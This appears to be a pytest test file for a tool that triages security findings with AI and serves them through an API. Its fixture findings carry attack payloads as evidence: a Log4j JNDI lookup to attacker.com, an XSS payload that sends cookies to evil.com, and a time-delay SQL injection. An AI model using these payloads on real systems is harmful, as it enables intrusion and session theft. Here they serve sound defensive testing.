import pytest
import json
import os
import asyncio
from fastapi.testclient import TestClient

from models import SecurityFinding, FindingAnalysis, BatchReport, EnrichedFinding
from pipeline.runner import FindingsPipelineRunner
from pipeline.ai_engine import CybersecurityAIEngine
from api.server import app, state

client = TestClient(app)

SAMPLE_TEST_FINDINGS = [
    {
        "id": "SEC-TEST-001",
        "title": "Remote Code Execution via Apache Log4j JNDI Lookup",
        "category": "CVE",
        "severity": "CRITICAL",
        "cve_id": "CVE-2021-44228",
        "cvss_score": 10.0,
        "asset": "auth.corp.internal",
        "component": "log4j-core:2.14.1",
        "endpoint": "POST /api/v1/auth/login",
        "discovery_tool": "Trivy SCA Scanner",
        "timestamp": "2026-09-18T08:14:22Z",
        "evidence": {
            "payload": "${jndi:ldap://attacker.com/exploit}",
            "header": "X-Forwarded-For",
            "log": "2026-09-18 08:14:22 WARN  [http-nio-8080-exec-1] org.apache.logging.log4j.core.net.JndiManager - Attempting to resolve JNDI URI"
        }
    },
    {
        "id": "SEC-TEST-002",
        "title": "Stored Cross-Site Scripting in User Profile",
        "category": "XSS",
        "severity": "HIGH",
        "asset": "app.internal.com",
        "endpoint": "PUT /api/v2/users/me/profile",
        "discovery_tool": "OWASP ZAP DAST",
        "timestamp": "2026-09-18T09:30:00Z",
        "evidence": {
            "parameter": "biography",
            "payload": "<svg/onload=fetch('//evil.com/?c='+document.cookie)>",
            "response_snippet": "<div class=\"bio\"><svg/onload=fetch('//evil.com/?c='+document.cookie)></div>"
        }
    },
    {
        "id": "SEC-TEST-003",
        "title": "Broken Object Level Authorization on Invoices",
        "category": "IDOR/BOLA",
        "severity": "HIGH",
        "asset": "billing.internal.com",
        "endpoint": "GET /api/v1/invoices/98421",
        "discovery_tool": "Burp Suite Enterprise",
        "timestamp": "2026-09-18T10:15:00Z",
        "evidence": {
            "authenticated_as": "tenant_uuid_1102",
            "target_object_tenant": "tenant_uuid_9941",
            "http_status": 200,
            "response_preview": "{\"invoice_id\": 98421, \"amount\": 45000.00, \"customer\": \"Acme Corp\"}"
        }
    },
    {
        "id": "SEC-TEST-004",
        "title": "Blind SQL Injection in Product Search Filter",
        "category": "SQL Injection",
        "severity": "CRITICAL",
        "asset": "catalog.store.internal",
        "endpoint": "GET /api/catalog/search?category=electronics&sort=price",
        "discovery_tool": "Sqlmap / DAST",
        "timestamp": "2026-09-18T11:00:00Z",
        "evidence": {
            "parameter": "sort",
            "payload": "price; WAITFOR DELAY '0:0:5'--",
            "timing_delta_ms": 5120
        }
    },
    {
        "id": "SEC-TEST-005",
        "title": "Plaintext Production AWS Secret Keys Committed in Config",
        "category": "Secret Leak",
        "severity": "CRITICAL",
        "asset": "github.internal/corp/payment-service",
        "component": "src/main/resources/application.properties",
        "discovery_tool": "Gitleaks SAST",
        "timestamp": "2026-09-18T12:00:00Z",
        "evidence": {
            "matched_secret_type": "AWS Access Key ID / Secret Key Pair",
            "access_key_preview": "AKIAIOSFODNN7EXAMPLE",
            "line_number": 42
        }
    }
]


def test_models_validation_and_normalization():
    """Verify that SecurityFinding and FindingAnalysis correctly normalize and validate."""
    finding = SecurityFinding.model_validate(SAMPLE_TEST_FINDINGS[0])
    assert finding.id == "SEC-TEST-001"
    assert finding.severity == "CRITICAL"
    assert finding.cve_id == "CVE-2021-44228"
    assert finding.cvss_score == 10.0

    # Test nested dict normalization in FindingAnalysis
    raw_analysis_with_dict = {
        "explanation": "Test explanation",
        "impact": {
            "technical_impact": "Technical impact details",
            "business_impact": "Business impact details",
            "blast_radius": "Blast radius description"
        },
        "evidence_interpretation": {"evidence_key": "evidence_value", "nested": 123},
        "recommended_remediation": {
            "immediate_mitigation": "Immediate mitigation steps",
            "permanent_fix": "Permanent fix details",
            "verification_steps": "Verification instructions"
        },
        "suggested_priority": "P0 - Critical",
        "remediation_effort": "LOW",
        "confidence_score": 0.95,
        "confidence_rating": "HIGH",
        "confidence_reasoning": "Confidence explanation",
        "executive_summary": "Executive summary text",
        "developer_oriented_explanation": "Developer context"
    }

    analysis = FindingAnalysis.model_validate(raw_analysis_with_dict)
    assert isinstance(analysis.evidence_interpretation, str)
    assert "evidence_key" in analysis.evidence_interpretation


def test_ai_pipeline_dynamic_reasoning():
    """Verify that the AI engine produces complete 7-dimension analyses across finding types."""
    async def _runner():
        engine = CybersecurityAIEngine(provider="expert-engine")
        
        for item in SAMPLE_TEST_FINDINGS:
            finding = SecurityFinding.model_validate(item)
            analysis = await engine.analyze_finding(finding)

            assert analysis is not None
            # 1. Explanation
            assert isinstance(analysis.explanation, str) and len(analysis.explanation) > 20
            # 2. Impact
            assert isinstance(analysis.impact.technical_impact, str) and len(analysis.impact.technical_impact) > 10
            assert isinstance(analysis.impact.business_impact, str) and len(analysis.impact.business_impact) > 10
            assert isinstance(analysis.impact.blast_radius, str) and len(analysis.impact.blast_radius) > 5
            # 3. Evidence interpretation
            assert isinstance(analysis.evidence_interpretation, str) and len(analysis.evidence_interpretation) > 10
            # 4. Recommended remediation
            assert isinstance(analysis.recommended_remediation.immediate_mitigation, str) and len(analysis.recommended_remediation.immediate_mitigation) > 10
            assert isinstance(analysis.recommended_remediation.permanent_fix, str) and len(analysis.recommended_remediation.permanent_fix) > 10
            assert isinstance(analysis.recommended_remediation.verification_steps, str) and len(analysis.recommended_remediation.verification_steps) > 10
            # 5. Executive summary
            assert isinstance(analysis.executive_summary, str) and len(analysis.executive_summary) > 15
            # 6. Developer explanation
            assert isinstance(analysis.developer_oriented_explanation, str) and len(analysis.developer_oriented_explanation) > 15
            # 7. Confidence reasoning & score
            assert isinstance(analysis.confidence_reasoning, str) and len(analysis.confidence_reasoning) > 5
            assert 0.0 <= analysis.confidence_score <= 1.0
            assert analysis.confidence_rating in ["HIGH", "MEDIUM", "LOW"]

    asyncio.run(_runner())


def test_batch_report_and_exports(tmp_path):
    """Verify batch processing, metric calculations, and export generators."""
    async def _runner():
        runner = FindingsPipelineRunner(provider="expert-engine")
        findings = [SecurityFinding.model_validate(f) for f in SAMPLE_TEST_FINDINGS]
        report = await runner.run_batch(findings)

        assert isinstance(report, BatchReport)
        assert report.metrics.total_findings == 5
        assert report.metrics.analyzed_findings == 5
        assert report.metrics.critical_or_high_count == 5
        assert report.metrics.average_confidence >= 0.80

        # Test exports
        json_path = tmp_path / "test_report.json"
        runner.export_json(report, str(json_path))
        assert os.path.exists(json_path)

        with open(json_path, "r", encoding="utf-8") as f:
            data = json.load(f)
            assert data["metrics"]["total_findings"] == 5

        md = runner.export_markdown(report)
        assert "# Cybersecurity AI Findings Analysis Report" in md
        assert "## Executive Summary & Metrics" in md
        assert "### [SEC-TEST-001]" in md

        html = runner.export_html(report)
        assert "<!DOCTYPE html>" in html
        assert "Cybersecurity AI Findings Analysis Report" in html

    asyncio.run(_runner())


def test_api_lifecycle():
    """Verify FastAPI endpoints: import, retrieval, analysis, custom findings, and clearing."""
    # 1. Clear state
    del_resp = client.delete("/api/findings")
    assert del_resp.status_code == 200
    assert client.get("/api/findings").json() == []

    # 2. Import findings
    import_resp = client.post("/api/findings/import", json=SAMPLE_TEST_FINDINGS)
    assert import_resp.status_code == 200
    assert import_resp.json()["imported"] == 5

    # 3. GET findings
    get_resp = client.get("/api/findings")
    assert get_resp.status_code == 200
    findings = get_resp.json()
    assert len(findings) == 5

    # 4. POST analyze single
    analyze_resp = client.post("/api/analyze/SEC-TEST-001")
    assert analyze_resp.status_code == 200
    data = analyze_resp.json()
    assert data["finding"]["id"] == "SEC-TEST-001"
    assert data["analysis"]["suggested_priority"] in ["P0 - Critical", "P1 - High"]

    # 5. POST analyze custom finding
    custom_payload = {
        "title": "Unauthenticated Sentry Debug Endpoint",
        "category": "Exposed Services",
        "severity": "HIGH",
        "asset": "debug.internal.com",
        "endpoint": "GET /debug/sentry",
        "evidence": {"log": "Internal stack traces dumped"}
    }
    custom_resp = client.post("/api/analyze-custom", json=custom_payload)
    assert custom_resp.status_code == 200
    custom_res = custom_resp.json()
    assert custom_res["finding"]["id"].startswith("CUSTOM-")
    assert custom_res["analysis"]["confidence_rating"] == "HIGH"

    # 6. GET exports
    resp_json = client.get("/api/export/json")
    assert resp_json.status_code == 200
    assert "findings" in resp_json.json()

    resp_md = client.get("/api/export/markdown")
    assert resp_md.status_code == 200
    assert resp_md.headers["content-type"].startswith("text/markdown")

    resp_html = client.get("/api/export/html")
    assert resp_html.status_code == 200
    assert resp_html.headers["content-type"].startswith("text/html")

    # 7. Delete single finding
    del_single = client.delete("/api/findings/SEC-TEST-001")
    assert del_single.status_code == 200

    # Verify count decremented
    assert len(client.get("/api/findings").json()) == 5  # 5 imported - 1 deleted + 1 custom = 5
